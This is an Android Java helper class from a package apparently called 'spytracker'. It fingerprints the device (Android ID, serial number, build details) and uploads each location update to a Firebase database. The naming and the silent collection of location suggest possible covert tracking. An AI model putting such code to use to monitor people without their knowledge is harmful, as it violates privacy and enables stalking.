package com.wsinf.spytracker.location;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;

import com.google.firebase.database.FirebaseDatabase;
import com.wsinf.spytracker.FbObject;
import com.wsinf.spytracker.PromiseOnObject;
import com.wsinf.spytracker.device.Device;
import com.wsinf.spytracker.device.FbDevice;
import com.wsinf.spytracker.point.FbPoint;
import com.wsinf.spytracker.point.Point;

public class FireBaseHelper implements LocationEvent {
    private final FirebaseDatabase firebaseDatabase;
    private final FbObject<Device> fbDevice;
    private FbObject<Point> fbPoint;
    private Context context;

    private Device currentDevice;

    public FireBaseHelper(final Context context) {
        this.context = context;
        firebaseDatabase = FirebaseDatabase.getInstance();
        fbDevice = new FbDevice(firebaseDatabase.getReference("Devices"));
        setOrCreate();
    }

    private void setOrCreate() {
        fbDevice.get(getAndroidId(), new PromiseOnObject<Device>() {
            @Override
            public void onReceive(Device object) {
                if (object == null)
                    createThisDevice();
                else
                    currentDevice = object;
            }
        });
    }

    private void createThisDevice() {
        currentDevice = new Device();
        currentDevice.setId(getAndroidId());
        currentDevice.setSerial(Build.SERIAL);
        currentDevice.setModel(Build.MODEL);
        currentDevice.setManufacture(Build.MANUFACTURER);
        currentDevice.setBrand(Build.BRAND);
        currentDevice.setType(Build.TYPE);
        currentDevice.setUser(Build.USER);
        currentDevice.setBase(Build.VERSION_CODES.BASE);
        currentDevice.setIncremental(Build.VERSION.INCREMENTAL);
        currentDevice.setSdk(Build.VERSION.SDK);
        currentDevice.setBoard(Build.BOARD);
        currentDevice.setHost(Build.HOST);
        currentDevice.setVersionCode(Build.VERSION.RELEASE);

        fbDevice.create(currentDevice);
    }

    @SuppressLint("HardwareIds")
    private String getAndroidId() {
        return Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ANDROID_ID);
    }

    @Override
    public void onLocationChange(double latitude, double longitude) {
        if (fbPoint == null && currentDevice != null)
            fbPoint = new FbPoint(firebaseDatabase.getReference("Points/" + currentDevice.getId()));

        if (fbPoint != null) {
            final Point point = new Point();
            point.setLatitude(latitude);
            point.setLongitude(longitude);
            point.setTimestamp(System.currentTimeMillis());

            fbPoint.create(point);
        }
    }
}
